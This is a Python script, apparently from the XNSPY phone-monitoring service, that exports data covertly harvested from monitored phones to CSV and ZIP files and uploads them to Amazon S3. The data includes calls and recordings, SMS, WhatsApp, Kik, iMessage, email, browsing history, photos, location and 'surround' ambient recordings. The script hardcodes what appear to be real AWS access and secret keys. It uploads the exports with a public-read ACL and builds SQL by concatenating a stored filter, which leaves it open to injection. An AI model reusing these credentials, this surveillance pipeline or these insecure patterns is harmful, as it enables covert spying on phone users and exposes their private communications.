#!/usr/bin/python

import MySQLdb, datetime, json, zipfile, os, tinys3

# Databse credentials
DB_HOST = "localhost"
DB_NAME = ""
DB_USER = "root"
DB_PASS = ""

# XNSPY Upload directory
FILE_DIR = "e:/GIT/"

# Amazon account credentials
S3_USER_KEY = "AKIAJ5YWEHL6XMMDGDVQ"
S3_SECRET_KEY = "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"
S3_BUCKET_NAME = "xnspydotcom"

# Open database connections
db_log = MySQLdb.connect(DB_HOST, DB_USER, DB_PASS, "xnspy_log_service" )
db_loga1 = MySQLdb.connect(DB_HOST, DB_USER, DB_PASS, "xnspy_log_service_a1" )
db_user = MySQLdb.connect(DB_HOST, DB_USER, DB_PASS, "xnspy_user_service" )

# Auto commit
# db_log.autocommit(True)

# prepare cursor objects using cursor() method
cursor_log = db_log.cursor(MySQLdb.cursors.DictCursor)
cursor_loga1 = db_loga1.cursor(MySQLdb.cursors.DictCursor)
cursor_user = db_user.cursor(MySQLdb.cursors.DictCursor)


def buildExportQuery(db_name, table_name, where, file_name):
	if (db_name == 'xnspy_log_service'):
		file_path = FILE_DIR + file_name + ".csv"
	else:
		file_path = FILE_DIR + file_name + "-a1.csv"

	# file_path = "e:/GIT/" + db_name + ".csv"
	sub_query = "INTO OUTFILE '" + file_path + "' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '\"' LINES TERMINATED BY '\n' "

	if (table_name == 'call_log'):
		query = """SELECT 
			caller_name AS `Contact name`, 
			call_number AS Number, 
			(CASE 
				WHEN (`call_type` = 1) THEN 'Incoming Call' 
				WHEN (`call_type` = 2) THEN 'Outgoing Call' 
				WHEN (`call_type` = 3) THEN 'Missed Call' 
			END) AS `type`, 
			call_duration AS `Duration(seconds)`, 
			call_start_time AS `Time(GMT)`, 
			recording_url as `Recording` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`call_log` 
		WHERE """ + where + """ 
		ORDER BY id DESC"""
	elif (table_name == 'sms_log'):
		query = """SELECT 
			(
				CASE 
					WHEN (`type` = 1) 
					THEN `sender` 
					ELSE `recipient` 
				END
			) AS `Number`,
			(
				CASE 
					WHEN (`type` = 1) 
					THEN `sender_name` 
					ELSE `recipient_name` 
				END
			) AS `Contact name`,
			`sms_log`.time AS `Time`,
			`sms_log`.geo_location_lattitude AS `Location latitude`,
			`sms_log`.geo_location_longitude AS `Location Longitude`, 
			`sms_log`.body AS `Text` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`sms_log` 
		WHERE """ + where + """ 
			AND `status` = 1 
		ORDER BY id DESC"""
		# query = "SELECT id, is_tinder_plus_subscriber, standard_email " + sub_query + " FROM `" + db_name + "`.`tinder_setting` ORDER BY id DESC"
	elif (table_name == 'browseing_history'):
		query = """SELECT 
			url_title AS `Page Title`, 
			url_address AS `Web Address`, 
			url_date AS `Time`,
			url_visits AS `Visted (count)`, 
			(CASE 
				WHEN (`is_bookmarked` = 0) THEN 'NO' 
				ELSE 'Yes' 
			END) AS `Book Marked` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`browseing_history` 
		WHERE """ + where + """ 
		ORDER BY id DESC"""
	elif (table_name == 'contact_log'):
		query = """SELECT 
			first_name AS `First Name`, 
			last_name AS `last Name`, 
			mobile_phone AS `Mobile Phone`, 
			office_phone AS `Office Phone`, 
			home_phone AS `Home Phone`, 
			email AS `Email address` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`contact_log` 
		WHERE """ + where + """ 
		ORDER BY id DESC"""
	elif (table_name == 'email'):
		query = """SELECT 
			email_subject AS `Subject`, 
			email_body AS `Email Text`, 
			(CASE 
				WHEN (`email_type` = 1) THEN 'Inbox' 
				WHEN (`email_type` = 2) THEN 'Sent' 
				WHEN (`email_type` = 3) THEN 'Other' 
			END) AS `Type`, 
			email_sender AS `Sender`, 
			email_recipient AS `Recipient`, 
			email_date AS `Time` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`email` 
		WHERE """ + where + """ 
		ORDER BY id DESC"""
	elif (table_name == 'geo_location'):
		query = """SELECT 
			longitude AS `Location Longitude`, 
			lattitude AS `Location latitude`, 
			address AS `Address`, 
			location_time AS `Time` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`geo_location` 
		WHERE """ + where + """ 
		ORDER BY id DESC"""
	elif (table_name == 'imessage_log'):
		query = """SELECT 
			body AS `Message`, 
			(CASE 
				WHEN (`type` = 1) THEN 'Incoming' 
				WHEN (`type` = 2) THEN 'Sent' 
				WHEN (`type` = 3) THEN 'Other' 
			END) AS `Type`, 
			sender AS `Sender`, 
			recipient AS `Recipient`, 
			`time` AS `Time` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`imessage_log` 
		WHERE """ + where + """ 
		ORDER BY id DESC"""
	elif (table_name == 'install_app_log'):
		query = """SELECT  
			`Name` AS `Application Name`, 
			`version` AS `Version`, 
			package_name AS `Package Name`, 
			`install_time` AS `Installed Time` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`install_app_log` 
		WHERE """ + where + """ 
		ORDER BY id DESC"""
	elif (table_name == 'photo'):
		query = """SELECT 
			`photo_generated_file_name` AS `Photo Name`, 
			photo_date_taken AS `Taken Time`, 
			`asset_url` AS `Download Path` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`photo` 
		WHERE """ + where + """ 
		ORDER BY id DESC"""
	elif (table_name == 'whatsapp_log'):
		query = """SELECT 
			`body` AS `Message`, 
			`time` AS `Time(GMT)`, 
			(CASE 
				WHEN (`type` = 1) THEN 'Received' 
				WHEN (`type` = 2) THEN 'Sent' 
				ELSE  'Other' 
			END) AS `type`, 
			(CASE 
				WHEN (`type` = 1) 
				THEN `sender` 
				ELSE `recipient` 
			END) AS `Contact name`, 
			(CASE 
				WHEN (`type` = 1) 
				THEN `phone_from` 
				ELSE `phone_to` 
			END) AS `Number` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`whatsapp_log` 
		WHERE """ + where + """ 
		ORDER BY id DESC"""
	elif (table_name == 'gmail'):
		query = """SELECT 
			gmail_subject AS `Subject`, 
			gmail_body AS `Email Text`, 
			(CASE 
				WHEN (`gmail_type` = 1) THEN 'Inbox' 
				WHEN (`gmail_type` = 2) THEN 'Sent' 
				WHEN (`gmail_type` = 3) THEN 'Other' 
			END) AS `Type`, 
			gmail_sender AS `Sender`, 
			gmail_recipient AS `Recipient`, 
			gmail_date AS `Time` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`gmail` 
		WHERE """ + where + """ 
		ORDER BY id DESC"""
	elif (table_name == 'appointment'):
		query = """SELECT 
			`title` AS `Title`, 
			detail AS `Detail`, 
			start_time AS `Start Time`, 
			end_time AS `End Time`, 
			(CASE 
				WHEN (`all_day_event` = 1) THEN 'Yes' 
				ELSE 'No' 
			END) AS `All Day Event`, 
			location AS `Location` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`appointment` 
		WHERE """ + where + """ 
		ORDER BY id DESC"""
	elif (table_name == 'video'):
		query = """SELECT 
			`video_generated_file_name` AS `Video Name`, 
			video_date_taken AS `Taken Time`, 
			`asset_url` AS `Download Path` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`video` 
		WHERE """ + where + """ 
		ORDER BY id DESC"""
	elif (table_name == 'recording'):
		query = """SELECT  
			`recording_generated_file_name` AS `Recording Name`, 
			recording_date AS `Recording Date`, 
			`asset_url` AS `Download Path` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`recording` 
		WHERE """ + where + """ 
		AND  recording_mode = 'surround' 
		ORDER BY id DESC"""
	elif (table_name == 'kik_message'):
		query = """SELECT 
			`msg_body` AS `Message`, 
			`msg_time` AS `Time(GMT)`, 
			(CASE 
				WHEN (`msg_type` = 1) THEN 'Received' 
				WHEN (`msg_type` = 2) THEN 'Sent' 
				ELSE  'Other' 
			END) AS `type`, 
			(CASE 
				WHEN (`msg_type` = 1) 
				THEN `msg_sender` 
				ELSE `msg_recipient` 
			END) AS `Contact name` """ + sub_query + """ 
		FROM 
			`""" + db_name + """`.`kik_message` 
		WHERE """ + where + """ 
		ORDER BY id DESC"""

	return query

def getColumnNames(table_name):
	if (table_name == 'call_log'):
		column_names = "Contact name, Number, type, Duration(seconds), Time(GMT), Recording\n"
	elif (table_name == 'sms_log'):
		column_names = "Number, Contact name, Time, Location latitude, Location Longitude, Text\n"
		# column_names = "id, is_tinder_plus_subscriber, standard_email\n"
	elif (table_name == 'browseing_history'):
		column_names = "Page Title, Web Address, Time, Visted (count), Book Marked\n"
	elif (table_name == 'contact_log'):
		column_names = "First Name, last Name, Mobile Phone, Office Phone, Home Phone, Email address\n"
	elif (table_name == 'email'):
		column_names = "Subject, Email Text, Type, Sender, Recipient, Time\n"
	elif (table_name == 'geo_location'):
		column_names = "Location Longitude, Location latitude, Address, Time\n"
	elif (table_name == 'imessage_log'):
		column_names = "Message, Type, Sender, Recipient, Time\n"
	elif (table_name == 'install_app_log'):
		column_names = "Application Name, Version, Package Name, Installed Time\n"
	elif (table_name == 'photo'):
		column_names = "Photo Name, Taken Time, Download Path\n"
	elif (table_name == 'whatsapp_log'):
		column_names = "Message, Time(GMT), type, Contact name, Number\n"
	elif (table_name == 'gmail'):
		column_names = "Subject, Email Text, Type, Sender, Recipient, Time\n"
	elif (table_name == 'appointment'):
		column_names = "Title, Detail, Start Time, End Time, All Day Event, Location\n"
	elif (table_name == 'video'):
		column_names = "Video Name, Taken Time, Download Path\n"
	elif (table_name == 'recording'):
		column_names = "Recording Name, Recording Date, Download Path\n"
	elif (table_name == 'kik_message'):
		column_names = "Message, Time(GMT), type, Contact name\n"

	return column_names

def createZIP(table_name, file_name):
	csv_file_name = FILE_DIR + file_name + '.csv'
	zip_file_name = FILE_DIR + file_name + '.zip'

	with open(csv_file_name, 'r') as original: data = original.read()

	with zipfile.ZipFile(zip_file_name, 'w') as myzip:
		# myzip.write(csv_file_name)
		myzip.writestr(file_name + '.csv', data)
	# ZipFile.close()

	# Delete csv file
	os.remove(csv_file_name)

	return zip_file_name

def createCSV(table_name, where, file_name):
	cursor_log.execute( buildExportQuery('xnspy_log_service', table_name, where, file_name) )
	cursor_loga1.execute( buildExportQuery('xnspy_log_service_a1', table_name, where, file_name) )

	csv_file1 = FILE_DIR + file_name + '.csv'
	csv_file2 = FILE_DIR + file_name + '-a1.csv'

	# fout = open(csv_file1, "r+")
	# # Add column headings
	# fout.write( getColumnNames(table_name) )
	# fout.close()

	# with open(csv_file1, 'r') as original: data = original.read()
	# with open(csv_file1, 'w') as modified: modified.write(getColumnNames(table_name) + data)

	# fout = open(csv_file1, "a")

	# file = open(csv_file2)
	# for line in file:
	# 	print 'iterate'
	# 	fout.write(line)
	# file.close()

	# fout.close()

	with open(csv_file1, 'r') as db1_file: data1 = db1_file.read()
	with open(csv_file2, 'r') as db2_file: data2 = db2_file.read()
	with open(csv_file1, 'w') as modified: modified.write(getColumnNames(table_name) + data1 + data2)

	# Delete csv file
	os.remove(csv_file2)

def s3Upload(file_name, uid, sid):
	time = datetime.datetime.now()

	file_path = FILE_DIR + file_name + ".zip"
	key_name = str(uid) + "/" + str(sid) + "/" + str(time.year) + "/" + str(time.month) + "/export/" + file_name + ".zip"

	conn = tinys3.Connection(S3_USER_KEY, S3_SECRET_KEY, tls=True, endpoint='s3-us-west-2.amazonaws.com')

	f = open(file_path,'rb')
	conn.upload(key_name,f,S3_BUCKET_NAME,headers={
		'x-amz-storage-class':'REDUCED_REDUNDANCY', 'x-amz-acl':'public-read'
	})
	f.close()

	# Delete ZIP file
	os.remove(file_path)

	return "https://s3-us-west-2.amazonaws.com/" + S3_BUCKET_NAME + "/" + key_name


# Prepare SQL query to fetch a record from the database.
sql = "SELECT * FROM export_job \
       WHERE status = '%d' ORDER BY id ASC LIMIT 1" % (1)
try:
	# Execute the SQL command
	cursor_log.execute(sql)
	# Fetch single row in a list of lists.
	export_job = cursor_log.fetchone()

	if (type(export_job) is dict):
		current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
		
		# Update "status" & "date_job_started" in database
		cursor_log.execute("""UPDATE export_job SET status = %s, date_job_started = %s WHERE id = %s""", 
			(2, current_time, export_job['id']))
		db_log.commit()

		parameters = json.loads( export_job['parameters'] )

		sid = export_job['app_service_id']
		file_name = str(sid) + "-" + datetime.datetime.now().strftime('%Y%m%d%H%M%S')

		cursor_user.execute("SELECT app_user_id FROM app_service WHERE id = %s" % (sid))
		service_user = cursor_user.fetchone()
		
		uid = service_user['app_user_id']
		table_name = export_job['table_name']
		where = parameters['where']
		
		# Create CSV file
		createCSV(table_name, where, file_name)

		# Create ZIP file
		zip_file_name = createZIP(table_name, file_name)

		current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

		# Update "status", "file_url" & "date_job_ended" in database
		cursor_log.execute("""UPDATE export_job SET status = %s, file_url = %s, date_job_ended = %s WHERE id = %s""", 
			(3, zip_file_name, current_time, export_job['id']))
		db_log.commit()

		# Upload ZIP file
		file_url = s3Upload(file_name, uid, sid)

		cursor_log.execute("""UPDATE export_job SET file_url = %s WHERE id = %s""", 
			(file_url, export_job['id']))
		db_log.commit()

		# Delete ZIP file
		# os.remove(zip_file_name)

		# print "Number of rows updated:",  cursor_log.rowcount

except Exception as e:
	print "Error: unable to fecth data"
	print e

# disconnect from server
db_log.close()
db_loga1.close()
db_user.close()